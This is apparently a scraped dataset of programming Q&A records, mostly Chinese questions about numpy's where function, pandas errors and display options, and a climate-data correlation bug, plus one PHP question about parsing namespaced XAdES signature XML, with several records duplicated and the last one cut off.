{"Answer": "https://www.cnblogs.com/massquantity/p/8908859.html\r\n\r\naa = np.arange(10)\r\nnp.where(aa,1,-1)\r\n相当于\r\naa = np.arange(10)\r\nnp.where(aa != 0,1,-1)", "Konwledge_Point": "NP完全问题", "Question": ["np.where这个函数不太理解", ["\n", "\n", "\n", "aa = np.arange(10)", "\nnp.where(aa,1,-1)", "\narray([-1,  1,  1,  1,  1,  1,  1,  1,  1,  1])  # 0为False，所以第一个输出-1", "\n", "\n", "\n", "\n\n", "疑问1，where函数的第一个参数为条件，把序列当成条件是什么意思？条件不是大于小于等这一类的吗？总之结果怎么来的", "\n\n", "\n", "\n", "\n", "np.where([[True,False], [True,True]],", "\n             [[1,2], [3,4]],", "\n             [[9,8], [7,6]])", "\narray([[1, 8],", "\n       [3, 4]])", "\n", "\n", "\n", "\n\n", "疑问2，[[True,False], [True,True]]为条件，满足条件输出 [[1,2], [3,4]],不满足输出 [[9,8], [7,6]]。（where函数的用法是这样的），结果是怎么来的", "\n\n", "\n", "\n", "\n", "np.where([[0, 1], [1, 0]])", "\n(array([0, 1]), array([1, 0]))", "\n上面这个例子条件中[[0,1],[1,0]]的真值为两个1，各自的第一维坐标为[0,1]，第二维坐标为[1,0] 。", "\n", "\n", "\n", "\n\n", "疑问3，这个结果和解释到底怎么来的", "\n\n", "\n", "\n", "\n", "a = np.arange(27).reshape(3,3,3)", "\na", "\narray([[[ 0,  1,  2],", "\n        [ 3,  4,  5],", "\n        [ 6,  7,  8]],", "\n", "\n", "\n", "\n\n", "   [[ 9, 10, 11],\n    [12, 13, 14],\n    [15, 16, 17]],\n\n   [[18, 19, 20],\n    [21, 22, 23],\n    [24, 25, 26]]])\n", "\n\n", "\n", "\n", "\n", "np.where(a > 5)", "\n(array([0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 2, 2, 2, 2, 2, 2, 2, 2, 2]),", "\n array([2, 2, 2, 0, 0, 0, 1, 1, 1, 2, 2, 2, 0, 0, 0, 1, 1, 1, 2, 2, 2]),", "\n array([0, 1, 2, 0, 1, 2, 0, 1, 2, 0, 1, 2, 0, 1, 2, 0, 1, 2, 0, 1, 2]))", "\n", "\n", "\n", "\n\n", "疑问4  这个结果得到的索引值也是完全看不懂"]], "Tag": "算法设计"}
{"Answer": "https://www.cnblogs.com/massquantity/p/8908859.html\r\n\r\naa = np.arange(10)\r\nnp.where(aa,1,-1)\r\n相当于\r\naa = np.arange(10)\r\nnp.where(aa != 0,1,-1)", "Konwledge_Point": "NP完全问题", "Question": ["np.where这个函数不太理解", ["\n", "\n", "\n", "aa = np.arange(10)", "\nnp.where(aa,1,-1)", "\narray([-1,  1,  1,  1,  1,  1,  1,  1,  1,  1])  # 0为False，所以第一个输出-1", "\n", "\n", "\n", "\n\n", "疑问1，where函数的第一个参数为条件，把序列当成条件是什么意思？条件不是大于小于等这一类的吗？总之结果怎么来的", "\n\n", "\n", "\n", "\n", "np.where([[True,False], [True,True]],", "\n             [[1,2], [3,4]],", "\n             [[9,8], [7,6]])", "\narray([[1, 8],", "\n       [3, 4]])", "\n", "\n", "\n", "\n\n", "疑问2，[[True,False], [True,True]]为条件，满足条件输出 [[1,2], [3,4]],不满足输出 [[9,8], [7,6]]。（where函数的用法是这样的），结果是怎么来的", "\n\n", "\n", "\n", "\n", "np.where([[0, 1], [1, 0]])", "\n(array([0, 1]), array([1, 0]))", "\n上面这个例子条件中[[0,1],[1,0]]的真值为两个1，各自的第一维坐标为[0,1]，第二维坐标为[1,0] 。", "\n", "\n", "\n", "\n\n", "疑问3，这个结果和解释到底怎么来的", "\n\n", "\n", "\n", "\n", "a = np.arange(27).reshape(3,3,3)", "\na", "\narray([[[ 0,  1,  2],", "\n        [ 3,  4,  5],", "\n        [ 6,  7,  8]],", "\n", "\n", "\n", "\n\n", "   [[ 9, 10, 11],\n    [12, 13, 14],\n    [15, 16, 17]],\n\n   [[18, 19, 20],\n    [21, 22, 23],\n    [24, 25, 26]]])\n", "\n\n", "\n", "\n", "\n", "np.where(a > 5)", "\n(array([0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 2, 2, 2, 2, 2, 2, 2, 2, 2]),", "\n array([2, 2, 2, 0, 0, 0, 1, 1, 1, 2, 2, 2, 0, 0, 0, 1, 1, 1, 2, 2, 2]),", "\n array([0, 1, 2, 0, 1, 2, 0, 1, 2, 0, 1, 2, 0, 1, 2, 0, 1, 2, 0, 1, 2]))", "\n", "\n", "\n", "\n\n", "疑问4  这个结果得到的索引值也是完全看不懂"]], "Tag": "算法设计"}
{"Answer": "&lt;p&gt;print一下train&amp;#xff0c;里面看看为啥里面没有”ViolentCrimesPerPop” 这个key&lt;/p&gt;", "Konwledge_Point": "NP完全问题", "Question": ["python中np.array的用法", ["violentcrimesperpop是表格中的一个参数，为什么是这个错误，完全看不懂啊。有没有大佬指导一下。源代码如下：", "\n\n", "\n\n", "\n\n", " ", "\n\n", " "]], "Tag": "算法设计"}
{"Answer": "&lt;p&gt;print一下train&amp;#xff0c;里面看看为啥里面没有”ViolentCrimesPerPop” 这个key&lt;/p&gt;", "Konwledge_Point": "NP完全问题", "Question": ["python中np.array的用法", ["violentcrimesperpop是表格中的一个参数，为什么是这个错误，完全看不懂啊。有没有大佬指导一下。源代码如下：", "\n\n", "\n\n", "\n\n", " ", "\n\n", " "]], "Tag": "算法设计"}
{"Answer": "&lt;p&gt;&lt;strong&gt;g_s_m.corr(g_a_d),类型转换一下&lt;/strong&gt;&lt;/p&gt;\n\n&lt;p&gt;g_s_m &amp;#61; pd.Series(era5_list&amp;#xff0c;dtype&amp;#61;np.float64)&lt;/p&gt;\n\n&lt;p&gt; &lt;/p&gt;", "Konwledge_Point": "NP完全问题", "Question": ["数据处理时出现'float' object has no attribute 'shape'怎么办？", ["我在用Python处理气象数据时出现的问题。按照工作需要，我在对ERA5（下载链接：链接：", "https://pan.baidu.com/s/1alH1cLXOAGYMz67dPdoZ2w ", " 提取码：", "c4b2", " ）和", "CRU_TS v4.04", "（下载链接：链接：", "https://pan.baidu.com/s/1c4IVFI-jetxuEThaCqml1g", " 提取码：", "w5r0 ", "）的气温数据进行分析，计算", "相关系数（CC）", "，后面计算的代码来源于网络，前面的代码作用的统一经纬度分辨率（把ERA5经纬度统一成与CRU_TS v4.04一样的0.5度乘0.5度），现在确认在统一经纬度分辨率没有问题。", "CRU_TS v4.04", "没有海洋和南极地区的数据，所以存在", "NaN空值", "，在如下的代码运算之后，", "\n\n", "\n", "import pandas as pd\nimport pylab as plt\nfrom netCDF4 import Dataset\nimport numpy as np\nfile_0 = 'G:\\\\Data\\\\TP_and_2mT_1950-1978_Monthly.nc'\nfile_A = 'G:\\\\Data\\\\cru_ts4.04.1901.2019.tmp.dat.nc'\na = Dataset(file_0)\nb = Dataset(file_A)\nt2m = a.variables[\"t2m\"][:]\ntmp = b.variables[\"tmp\"][:]\nt2m = t2m[-1]\nnum = 1\nnum0 = 1\nfor i in range(720):\n    t2m = np.delete(t2m, num, axis=1)\n    num = num + 1\nfor i in range(360):\n    t2m = np.delete(t2m, num0, axis=0)\n    num0 = num0 + 1\nt2m = np.delete(t2m, -1, axis=0)\nt2m = t2m - 273.15\nt2m_xin = []\nfor i in range(0, len(t2m)):\n    for j in t2m[i]:\n        t2m_xin.append(j)\ntmp = tmp[935]\ntmp_new = []\nfor i in range(0, len(tmp)):\n    for j in tmp[i]:\n        tmp_new.append(j)\nera5_list = t2m_xin\ncru_ts_list = tmp_new\n\ng_s_m = pd.Series(era5_list)  # 利用Series将列表转换成新的、pandas可处理的数据\ng_a_d = pd.Series(cru_ts_list)\n\ncorr_gust = round(g_s_m.corr(g_a_d), 4)  # 计算标准差，round(a, 4)是保留a的前四位小数\n\nprint('corr_gust :', corr_gust)\n# 最后画一下两列表散点图，直观感受下，结合相关系数揣摩揣摩\nplt.scatter(era5_list, cru_ts_list)\nplt.title('corr_gust :' + str(corr_gust), fontproperties='SimHei')  # 给图写上title\nplt.show()", "\n\n", "报错：", "\n\n", "Traceback (most recent call last):", "\n  File \"G:\\Data_dispose\\CC.py\",", " line 37", ", in <module>", "\n    corr_gust = round(g_s_m.corr(g_a_d), 4)  # 计算标准差，round(a, 4)是保留a的前四位小数", "\n  File \"C:\\Users\\Liu Huageng\\AppData\\Roaming\\Python\\Python39\\site-packages\\pandas\\core\\series.py\", line 2327, in corr", "\n    return nanops.nancorr(", "\n  File \"C:\\Users\\Liu Huageng\\AppData\\Roaming\\Python\\Python39\\site-packages\\pandas\\core\\nanops.py\", line 71, in _f", "\n    return f(*args, **kwargs)", "\n  File \"C:\\Users\\Liu Huageng\\AppData\\Roaming\\Python\\Python39\\site-packages\\pandas\\core\\nanops.py\", line 1459, in nancorr", "\n    return f(a, b)", "\n  File \"C:\\Users\\Liu Huageng\\AppData\\Roaming\\Python\\Python39\\site-packages\\pandas\\core\\nanops.py\", line 1480, in func", "\n    return np.corrcoef(a, b)[0, 1]", "\n  File \"<__array_function__ internals>\", line 5, in corrcoef", "\n  File \"C:\\Users\\Liu Huageng\\AppData\\Local\\Programs\\Python\\Python39\\lib\\site-packages\\numpy\\lib\\function_base.py\", line 2551, in corrcoef", "\n    c = cov(x, y, rowvar)", "\n  File \"<__array_function__ internals>\", line 5, in cov", "\n  File \"C:\\Users\\Liu Huageng\\AppData\\Local\\Programs\\Python\\Python39\\lib\\site-packages\\numpy\\lib\\function_base.py\", line 2456, in cov", "\n    avg, w_sum = average(X, axis=1, weights=w, returned=True)", "\n  File \"<__array_function__ internals>\", line 5, in average", "\n  File \"C:\\Users\\Liu Huageng\\AppData\\Local\\Programs\\Python\\Python39\\lib\\site-packages\\numpy\\lib\\function_base.py\", line 415, in average", "\n    if scl.shape != avg.shape:", "\nAttributeError: ", "'float' object has no attribute 'shape'", "\n\n", "随后，我用简单的数据类型转换，通过遍历列表里的数据，变成float类型数据，代码如下", "（第31-34行改动）", "，", "\n\n", "\n", "import pandas as pd\nimport pylab as plt\nfrom netCDF4 import Dataset\nimport numpy as np\nfile_0 = 'G:\\\\Data\\\\TP_and_2mT_1950-1978_Monthly.nc'\nfile_A = 'G:\\\\Data\\\\cru_ts4.04.1901.2019.tmp.dat.nc'\na = Dataset(file_0)\nb = Dataset(file_A)\nt2m = a.variables[\"t2m\"][:]\ntmp = b.variables[\"tmp\"][:]\nt2m = t2m[-1]\nnum = 1\nnum0 = 1\nfor i in range(720):\n    t2m = np.delete(t2m, num, axis=1)\n    num = num + 1\nfor i in range(360):\n    t2m = np.delete(t2m, num0, axis=0)\n    num0 = num0 + 1\nt2m = np.delete(t2m, -1, axis=0)\nt2m = t2m - 273.15\nt2m_xin = []\nfor i in range(0, len(t2m)):\n    for j in t2m[i]:\n        t2m_xin.append(j)\ntmp = tmp[935]\ntmp_new = []\nfor i in range(0, len(tmp)):\n    for j in tmp[i]:\n        tmp_new.append(j)\ntmp_new_0 = []\nfor k in range(len(tmp_new)):\n    k = float(k)\n    tmp_new_0.append(k)\nera5_list = t2m_xin\ncru_ts_list = tmp_new_0\n\ng_s_m = pd.Series(era5_list)  # 利用Series将列表转换成新的、pandas可处理的数据\ng_a_d = pd.Series(cru_ts_list)\n\ncorr_gust = round(g_s_m.corr(g_a_d), 4)  # 计算标准差，round(a, 4)是保留a的前四位小数\n\nprint('corr_gust :', corr_gust)\n# 最后画一下两列表散点图，直观感受下，结合相关系数揣摩揣摩\nplt.scatter(era5_list, cru_ts_list)\nplt.title('corr_gust :' + str(corr_gust), fontproperties='SimHei')  # 给图写上title\nplt.show()", "\n\n", "确实没有报错，但是", "CRU_TS v4.04", "的", "数据已经发生改变", "，结果完全不符合实际情况，如图：", "\n\n", "\n\n", "可以看出横坐标为ERA5的气温数据正常，纵坐标数据已经“废了”，为什么会这样？这么解决？刚入门编程不到半年的小白向大佬们请教。"]], "Tag": "算法设计"}
{"Answer": "&lt;p&gt;&lt;strong&gt;g_s_m.corr(g_a_d),类型转换一下&lt;/strong&gt;&lt;/p&gt;\n\n&lt;p&gt;g_s_m &amp;#61; pd.Series(era5_list&amp;#xff0c;dtype&amp;#61;np.float64)&lt;/p&gt;\n\n&lt;p&gt; &lt;/p&gt;", "Konwledge_Point": "NP完全问题", "Question": ["数据处理时出现'float' object has no attribute 'shape'怎么办？", ["我在用Python处理气象数据时出现的问题。按照工作需要，我在对ERA5（下载链接：链接：", "https://pan.baidu.com/s/1alH1cLXOAGYMz67dPdoZ2w ", " 提取码：", "c4b2", " ）和", "CRU_TS v4.04", "（下载链接：链接：", "https://pan.baidu.com/s/1c4IVFI-jetxuEThaCqml1g", " 提取码：", "w5r0 ", "）的气温数据进行分析，计算", "相关系数（CC）", "，后面计算的代码来源于网络，前面的代码作用的统一经纬度分辨率（把ERA5经纬度统一成与CRU_TS v4.04一样的0.5度乘0.5度），现在确认在统一经纬度分辨率没有问题。", "CRU_TS v4.04", "没有海洋和南极地区的数据，所以存在", "NaN空值", "，在如下的代码运算之后，", "\n\n", "\n", "import pandas as pd\nimport pylab as plt\nfrom netCDF4 import Dataset\nimport numpy as np\nfile_0 = 'G:\\\\Data\\\\TP_and_2mT_1950-1978_Monthly.nc'\nfile_A = 'G:\\\\Data\\\\cru_ts4.04.1901.2019.tmp.dat.nc'\na = Dataset(file_0)\nb = Dataset(file_A)\nt2m = a.variables[\"t2m\"][:]\ntmp = b.variables[\"tmp\"][:]\nt2m = t2m[-1]\nnum = 1\nnum0 = 1\nfor i in range(720):\n    t2m = np.delete(t2m, num, axis=1)\n    num = num + 1\nfor i in range(360):\n    t2m = np.delete(t2m, num0, axis=0)\n    num0 = num0 + 1\nt2m = np.delete(t2m, -1, axis=0)\nt2m = t2m - 273.15\nt2m_xin = []\nfor i in range(0, len(t2m)):\n    for j in t2m[i]:\n        t2m_xin.append(j)\ntmp = tmp[935]\ntmp_new = []\nfor i in range(0, len(tmp)):\n    for j in tmp[i]:\n        tmp_new.append(j)\nera5_list = t2m_xin\ncru_ts_list = tmp_new\n\ng_s_m = pd.Series(era5_list)  # 利用Series将列表转换成新的、pandas可处理的数据\ng_a_d = pd.Series(cru_ts_list)\n\ncorr_gust = round(g_s_m.corr(g_a_d), 4)  # 计算标准差，round(a, 4)是保留a的前四位小数\n\nprint('corr_gust :', corr_gust)\n# 最后画一下两列表散点图，直观感受下，结合相关系数揣摩揣摩\nplt.scatter(era5_list, cru_ts_list)\nplt.title('corr_gust :' + str(corr_gust), fontproperties='SimHei')  # 给图写上title\nplt.show()", "\n\n", "报错：", "\n\n", "Traceback (most recent call last):", "\n  File \"G:\\Data_dispose\\CC.py\",", " line 37", ", in <module>", "\n    corr_gust = round(g_s_m.corr(g_a_d), 4)  # 计算标准差，round(a, 4)是保留a的前四位小数", "\n  File \"C:\\Users\\Liu Huageng\\AppData\\Roaming\\Python\\Python39\\site-packages\\pandas\\core\\series.py\", line 2327, in corr", "\n    return nanops.nancorr(", "\n  File \"C:\\Users\\Liu Huageng\\AppData\\Roaming\\Python\\Python39\\site-packages\\pandas\\core\\nanops.py\", line 71, in _f", "\n    return f(*args, **kwargs)", "\n  File \"C:\\Users\\Liu Huageng\\AppData\\Roaming\\Python\\Python39\\site-packages\\pandas\\core\\nanops.py\", line 1459, in nancorr", "\n    return f(a, b)", "\n  File \"C:\\Users\\Liu Huageng\\AppData\\Roaming\\Python\\Python39\\site-packages\\pandas\\core\\nanops.py\", line 1480, in func", "\n    return np.corrcoef(a, b)[0, 1]", "\n  File \"<__array_function__ internals>\", line 5, in corrcoef", "\n  File \"C:\\Users\\Liu Huageng\\AppData\\Local\\Programs\\Python\\Python39\\lib\\site-packages\\numpy\\lib\\function_base.py\", line 2551, in corrcoef", "\n    c = cov(x, y, rowvar)", "\n  File \"<__array_function__ internals>\", line 5, in cov", "\n  File \"C:\\Users\\Liu Huageng\\AppData\\Local\\Programs\\Python\\Python39\\lib\\site-packages\\numpy\\lib\\function_base.py\", line 2456, in cov", "\n    avg, w_sum = average(X, axis=1, weights=w, returned=True)", "\n  File \"<__array_function__ internals>\", line 5, in average", "\n  File \"C:\\Users\\Liu Huageng\\AppData\\Local\\Programs\\Python\\Python39\\lib\\site-packages\\numpy\\lib\\function_base.py\", line 415, in average", "\n    if scl.shape != avg.shape:", "\nAttributeError: ", "'float' object has no attribute 'shape'", "\n\n", "随后，我用简单的数据类型转换，通过遍历列表里的数据，变成float类型数据，代码如下", "（第31-34行改动）", "，", "\n\n", "\n", "import pandas as pd\nimport pylab as plt\nfrom netCDF4 import Dataset\nimport numpy as np\nfile_0 = 'G:\\\\Data\\\\TP_and_2mT_1950-1978_Monthly.nc'\nfile_A = 'G:\\\\Data\\\\cru_ts4.04.1901.2019.tmp.dat.nc'\na = Dataset(file_0)\nb = Dataset(file_A)\nt2m = a.variables[\"t2m\"][:]\ntmp = b.variables[\"tmp\"][:]\nt2m = t2m[-1]\nnum = 1\nnum0 = 1\nfor i in range(720):\n    t2m = np.delete(t2m, num, axis=1)\n    num = num + 1\nfor i in range(360):\n    t2m = np.delete(t2m, num0, axis=0)\n    num0 = num0 + 1\nt2m = np.delete(t2m, -1, axis=0)\nt2m = t2m - 273.15\nt2m_xin = []\nfor i in range(0, len(t2m)):\n    for j in t2m[i]:\n        t2m_xin.append(j)\ntmp = tmp[935]\ntmp_new = []\nfor i in range(0, len(tmp)):\n    for j in tmp[i]:\n        tmp_new.append(j)\ntmp_new_0 = []\nfor k in range(len(tmp_new)):\n    k = float(k)\n    tmp_new_0.append(k)\nera5_list = t2m_xin\ncru_ts_list = tmp_new_0\n\ng_s_m = pd.Series(era5_list)  # 利用Series将列表转换成新的、pandas可处理的数据\ng_a_d = pd.Series(cru_ts_list)\n\ncorr_gust = round(g_s_m.corr(g_a_d), 4)  # 计算标准差，round(a, 4)是保留a的前四位小数\n\nprint('corr_gust :', corr_gust)\n# 最后画一下两列表散点图，直观感受下，结合相关系数揣摩揣摩\nplt.scatter(era5_list, cru_ts_list)\nplt.title('corr_gust :' + str(corr_gust), fontproperties='SimHei')  # 给图写上title\nplt.show()", "\n\n", "确实没有报错，但是", "CRU_TS v4.04", "的", "数据已经发生改变", "，结果完全不符合实际情况，如图：", "\n\n", "\n\n", "可以看出横坐标为ERA5的气温数据正常，纵坐标数据已经“废了”，为什么会这样？这么解决？刚入门编程不到半年的小白向大佬们请教。"]], "Tag": "算法设计"}
{"Answer": "&lt;p&gt;用pandas 试试&lt;/p&gt;\n&lt;p&gt;pd.set_option(&amp;#39;display.max_columns&amp;#39;, 1000) #显示完整的列&lt;br /&gt;pd.set_option(&amp;#39;display.max_rows&amp;#39;, None) #显示完整的行&lt;/p&gt;", "Konwledge_Point": "NP完全问题", "Question": ["Python describe 显示不完全的问题要怎么解决", ["python", "在Python中对数据框进行describe的时候，如果字段稍微多一些，则会将一些列自动省略掉，", "在网上查了一些方法，比如：", "import numpy as np", "\n", "np.set_printoptions(threshold=np.inf)", "但是对于describe无效", "使用转置也同样不行", "如何解决这个问题？图片说明", "或者有什么替代方案？", "谢谢！"]], "Tag": "算法设计"}
{"Answer": "&lt;p&gt;用pandas 试试&lt;/p&gt;\n&lt;p&gt;pd.set_option(&amp;#39;display.max_columns&amp;#39;, 1000) #显示完整的列&lt;br /&gt;pd.set_option(&amp;#39;display.max_rows&amp;#39;, None) #显示完整的行&lt;/p&gt;", "Konwledge_Point": "NP完全问题", "Question": ["Python describe 显示不完全的问题要怎么解决", ["python", "在Python中对数据框进行describe的时候，如果字段稍微多一些，则会将一些列自动省略掉，", "在网上查了一些方法，比如：", "import numpy as np", "\n", "np.set_printoptions(threshold=np.inf)", "但是对于describe无效", "使用转置也同样不行", "如何解决这个问题？图片说明", "或者有什么替代方案？", "谢谢！"]], "Tag": "算法设计"}
{"Answer": "&lt;div class=\"post-text\" itemprop=\"text\"&gt;\r\n&lt;p&gt;Thanks to the &lt;a href=\"https://stackoverflow.com/questions/35435626/simplexml-load-string-doesnt-fully-load-xades-bes-signature-xml?noredirect=1#comment58599247_35435626\"&gt;michi's comment&lt;/a&gt;, I found a solution. Namespaced nodes should be accessed differently than nodes without namespace.&lt;/p&gt;\n\n&lt;p&gt;So, basing on the example above, when I want to use Signature node, I can do it like this:&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;$xml = simplexml_load_string($content);\n$signatureNode = $xml-&amp;gt;children('ds', true)-&amp;gt;Signature;\n&lt;/code&gt;&lt;/pre&gt;\n    &lt;/div&gt;", "Konwledge_Point": "NP完全问题", "Question": ["sImplexml_load_string未完全加载XAdES-BES签名XML", ["\n\n", "I've got XML containing XAdES-BES digita signature:", "\n\n", "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<Signatures Id=\"ID-222cf3cf-0f0b-49d2-b7cb-4cf47bb373cb\">\n   <ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\" Id=\"ID-9a61610b-c8e3-4201-bf41-a174cbc21634\">\n      <ds:SignedInfo Id=\"ID-8ebe3e85-1413-4fec-a14c-7264546ab770\">\n         <ds:CanonicalizationMethod Algorithm=\"http://www.w3.org/TR/2001/REC-xml-c14n-20010315\" />\n         <ds:SignatureMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#rsa-sha1\" />\n         <ds:Reference Id=\"ID-e751928b-6823-47ad-a5ae-b7ccdf301751\" URI=\"#ID-e37958b8-134c-4f51-9b25-8274fd1edce7\">\n            <ds:DigestMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#sha1\" />\n            <ds:DigestValue>Z7q3zqS5FTNPP/mj0rDmUV5PdZQ=</ds:DigestValue>\n         </ds:Reference>\n         <ds:Reference Id=\"ID-396858b0-7e4b-42e1-ba5f-18368f90f0df\" URI=\"#ID-90b9721b-1d1c-4104-ae2c-ebb6b251cf2b\" Type=\"http://uri.etsi.org/01903#SignedProperties\">\n            <ds:DigestMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#sha1\" />\n            <ds:DigestValue>H7EeV4pPoJ6WhWFnVSo3WNu3Yj8=</ds:DigestValue>\n         </ds:Reference>\n      </ds:SignedInfo>\n      <ds:SignatureValue Id=\"ID-949000f9-85bc-435e-b387-8f7aa5551d75\">a0cc/hQYjmwQC8ssBzolLyArUqOVi+s6cP+lbxku69qGleBUroQlvD6o+GpIxSJB6wlWwic3YjuxDxn9\nmfW2jCLYEEM1RB277ChnHASakC+vbBP03LWC+GxsOe0seKMVsCc0EPwS5kk5RfvrUN6sTxWSW/2MOIXG\n4fW1cAtjh1SjDN9Ij38SIuWpW8guJ9EGEVyTUuTiZ5dbpHfxftgKfHmr16aMpXk0ta46X2UuGTQRB+E/\n0W+RpLqdmTP5VG0CxT8Z2H4n6puGL0yC20SsZZDethL/Vnr67EXTPmHFUwoZOGNu+0IFdBJW4HvLA5rF\nczL82MOsCoFXqzMVxGxiqw==</ds:SignatureValue>\n      <ds:KeyInfo>\n         <ds:KeyValue>\n            <ds:RSAKeyValue>\n               <ds:Modulus>AL4k+zz02RytjonBY0af0dfuuDJhNg0dypClqzkLyyLjkTa9QUbtdtA20lRuogjFqb6CVpqQ/PEdXDK5\nbN6qGBQGsmdqkgru6A8aAc57QawEcbEL+rDue1L+mqM/JVnr+DAWOehITd8HzS0JQTQcxF1Lv0L1GNbJ\nP8/bo8Coj2EVtKZ9tBI9+AZUdZ11uKBYj9uvKy0VGufjoljIIrQASIft4nw8a/WF+beEYOrl3PqnBcAo\nLc/CJiNsnsASws0a/EKuaP3vQbIo36s7FVH7U4x/8ypcAPsmtgi9LbH+v9Ugc2CiCj7krJIT3X9EwkjC\nFUq+MykmVvfW0D0bOTP2X5k=</ds:Modulus>\n               <ds:Exponent>AQAB</ds:Exponent>\n            </ds:RSAKeyValue>\n         </ds:KeyValue>\n         <ds:X509Data>\n            <ds:X509Certificate>MIIGETCCBPmgAwIBAgIUaQ+g3SS0YfvHQus43mbJ+4FSYegwDQYJKoZIhvcNAQEFBQAwczELMAkGA1UE\nBhMCUEwxKDAmBgNVBAoMH0tyYWpvd2EgSXpiYSBSb3psaWN6ZW5pb3dhIFMuQS4xJDAiBgNVBAMMG0NP\nUEUgU1pBRklSIC0gS3dhbGlmaWtvd2FueTEUMBIGA1UEBRMLTnIgd3Bpc3U6IDYwHhcNMTUxMDA4MTIw\nMDAwWhcNMTYxMDA4MTIwMDAwWjB2MQswCQYDVQQGEwJQTDEbMBkGA1UEBRMSUEVTRUw6IDg2MDYxMzE0\nMzk3MR8wHQYDVQQDDBZLYW1pbCBTZWJhc3RpYW4gTWlqYWN6MRgwFgYDVQQqDA9LYW1pbCBTZWJhc3Rp\nYW4xDzANBgNVBAQMBk1pamFjejCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAL4k+zz02Ryt\njonBY0af0dfuuDJhNg0dypClqzkLyyLjkTa9QUbtdtA20lRuogjFqb6CVpqQ/PEdXDK5bN6qGBQGsmdq\nkgru6A8aAc57QawEcbEL+rDue1L+mqM/JVnr+DAWOehITd8HzS0JQTQcxF1Lv0L1GNbJP8/bo8Coj2EV\ntKZ9tBI9+AZUdZ11uKBYj9uvKy0VGufjoljIIrQASIft4nw8a/WF+beEYOrl3PqnBcAoLc/CJiNsnsAS\nws0a/EKuaP3vQbIo36s7FVH7U4x/8ypcAPsmtgi9LbH+v9Ugc2CiCj7krJIT3X9EwkjCFUq+MykmVvfW\n0D0bOTP2X5kCAwEAAaOCApgwggKUMAwGA1UdEwEB/wQCMAAwggFPBgNVHSABAf8EggFDMIIBPzCCATsG\nCSqEaAGG9yMBATCCASwwgd0GCCsGAQUFBwICMIHQDIHNRGVrbGFyYWNqYSB0YSBqZXN0IG/Fm3dpYWRj\nemVuaWVtIHd5ZGF3Y3ksIMW8ZSB0ZW4gY2VydHlmaWthdCB6b3N0YcWCIHd5ZGFueSBqYWtvIGNlcnR5\nZmlrYXQga3dhbGlmaWtvd2FueSB6Z29kbmllIHogd3ltYWdhbmlhbWkgdXN0YXd5IG8gcG9kcGlzaWUg\nZWxla3Ryb25pY3pueW0gb3JheiB0b3dhcnp5c3rEhWN5bWkgamVqIHJvenBvcnrEhWR6ZW5pYW1pLjBK\nBggrBgEFBQcCARY+aHR0cDovL3d3dy5lbGVrdHJvbmljem55cG9kcGlzLnBsL2luZm9ybWFjamUvZG9r\ndW1lbnR5LWktdW1vd3kwCQYDVR0JBAIwADAhBgNVHREEGjAYgRZrYW1pbC5taWphY3pAZ21haWwuY29t\nMA4GA1UdDwEB/wQEAwIGQDCBsAYDVR0jBIGoMIGlgBTMQSp2mC5KehnakTbf2H85P9TCrqF3pHUwczEL\nMAkGA1UEBhMCUEwxKDAmBgNVBAoMH0tyYWpvd2EgSXpiYSBSb3psaWN6ZW5pb3dhIFMuQS4xJDAiBgNV\nBAMMG0NPUEUgU1pBRklSIC0gS3dhbGlmaWtvd2FueTEUMBIGA1UEBRMLTnIgd3Bpc3U6IDaCFH18c1x7\nvNOu01acH+WfGYiAcun0MEAGA1UdHwQ5MDcwNaAzoDGGL2h0dHA6Ly9lbGVrdHJvbmljem55cG9kcGlz\nLnBsL2NybC9jcmxfb3prNTIuY3JsMA0GCSqGSIb3DQEBBQUAA4IBAQAP0zddWprl5hpXiIiMGcC5D7ob\n/nj3wvfOUm0QCf7+ZEorfr6EC96B6F/cNtZ1wXtAQXkf5Zm3gPhbKXY6XWM2NDWadZrDV9zV75Ab06dQ\n5qmDfuMGTfPUdH3+QBmW7YnniWPCGuMzGNlP9DpZ45YrgRnwlsZSHMhX0HiEeDfYKAkGhIaJ7lcPlZrj\nzWBdhUOgYm06pYf8NEKVWzu808iIHIvCBot0ADcZ8ypxDyQsco/RSRGY0EO8FATCH3j2Oe/+7FGRjRQK\nXczBsKu6G8GQ6b/eGuWD7NNAuBX4UJu9jXRo9mzo7zKj01/SPfE4kHTHfHr9yi9BBkzAmaAxQpT5</ds:X509Certificate>\n         </ds:X509Data>\n      </ds:KeyInfo>\n      <ds:Object>\n         <xades:QualifyingProperties xmlns:xades=\"http://uri.etsi.org/01903/v1.3.2#\" Id=\"ID-04b0ddeb-914c-419f-acb2-780dae2ee890\" Target=\"#ID-9a61610b-c8e3-4201-bf41-a174cbc21634\">\n            <xades:SignedProperties Id=\"ID-90b9721b-1d1c-4104-ae2c-ebb6b251cf2b\">\n               <xades:SignedSignatureProperties>\n                  <xades:SigningTime>2015-12-08T13:37:16Z</xades:SigningTime>\n                  <xades:SigningCertificate>\n                     <xades:Cert>\n                        <xades:CertDigest>\n                           <ds:DigestMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#sha1\" />\n                           <ds:DigestValue>+6UE5SSks6Cn6++o8CAkSO/NMWk=</ds:DigestValue>\n                        </xades:CertDigest>\n                        <xades:IssuerSerial>\n                           <ds:X509IssuerName>serialNumber=Nr wpisu: 6,CN=COPE SZAFIR - Kwalifikowany,O=Krajowa Izba Rozliczeniowa S.A.,C=PL</ds:X509IssuerName>\n                           <ds:X509SerialNumber>599792555331422089182929030726347827824527827432</ds:X509SerialNumber>\n                        </xades:IssuerSerial>\n                     </xades:Cert>\n                  </xades:SigningCertificate>\n               </xades:SignedSignatureProperties>\n               <xades:SignedDataObjectProperties>\n                  <xades:DataObjectFormat ObjectReference=\"#ID-e751928b-6823-47ad-a5ae-b7ccdf301751\">\n                     <xades:Description>Dokument w formacie xml [XML]</xades:Description>\n                     <xades:MimeType>text/plain</xades:MimeType>\n                     <xades:Encoding>http://www.w3.org/2000/09/xmldsig#base64</xades:Encoding>\n                  </xades:DataObjectFormat>\n               </xades:SignedDataObjectProperties>\n            </xades:SignedProperties>\n         </xades:QualifyingProperties>\n      </ds:Object>\n      <ds:Object Encoding=\"http://www.w3.org/2000/09/xmldsig#base64\" 